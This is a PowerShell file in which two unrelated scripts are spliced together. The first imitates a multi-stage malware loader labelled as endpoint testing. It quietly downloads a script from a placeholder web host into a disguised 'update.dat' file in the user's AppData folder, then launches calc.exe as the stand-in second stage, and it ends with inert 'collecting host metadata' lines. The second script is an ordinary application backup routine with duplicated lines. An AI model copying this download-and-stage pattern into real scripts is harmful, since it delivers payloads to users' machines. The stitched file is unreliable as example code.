<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://example.com:80/stage1.ps1',
    [string]$PayloadPath = "$env:APPDATA\update.dat",
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$TransferTimeout = 123
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 123
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $PayloadPath -TimeoutSec $TransferTimeout
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $PayloadPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
Write-Verbose "Validating result"
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Write-Verbose "Applying operation timeout"
$StageMarker = "stage-41"
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.DESCRIPTION
    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
    retention window to the archive folder.
    Only files below the configured backup root are pruned, so a mistyped
    retention value cannot reach outside the archive directory.
.EXAMPLE
    .\Start-AppBackup.ps1 -RetentionDays 30
.EXAMPLE
    .\Start-AppBackup.ps1 -BackupRoot E:\Backups\Portal -DryRun
#>

[CmdletBinding()]
param(
    [string]$SourcePath = "D:\Apps\Contoso.Portal",
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = 'E:\Backups\Portal',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 30,
    [ValidateSet('Optimal', 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = "Fastest",

    [int]$MinFreeGB = 10,
    [switch]$DryRun
)

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 6 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8
$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List

$MailTo = 'backup-ops@adatum.com'
$MailFrom = 'backup@adatum.com'
$mailBody = ("Archive: {0} ({1} MB)" -f $archive, $manifest.SizeMB)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Backup completed'
    Body       = $mailBody
    SmtpServer = "smtp.adatum.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
